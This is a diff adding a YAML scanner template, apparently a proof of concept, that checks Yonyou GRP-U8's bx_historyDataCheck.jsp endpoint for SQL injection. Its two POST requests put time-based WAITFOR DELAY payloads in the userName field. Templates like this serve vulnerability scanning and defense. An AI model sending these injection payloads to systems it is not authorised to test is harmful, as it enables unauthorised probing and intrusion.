@@ -1,0 +1,25 @@
+name: poc-yaml-用友GRP-U8-sql
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 6
+matchCount: 2
+rules:
+  - method: POST
+    path: /u8qx/bx_historyDataCheck.jsp
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >
+      userName=';WAITFOR DELAY '0:0:3'--&ysnd=&historyFlag=
+    expression:
+      status: 200
+      sleep: 3
+  - method: POST
+    path: /u8qx/bx_historyDataCheck.jsp
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >
+      userName=';WAITFOR DELAY '0:0:4'--&ysnd=&historyFlag=
+    expression:
+      status: 200
+      sleep: 4
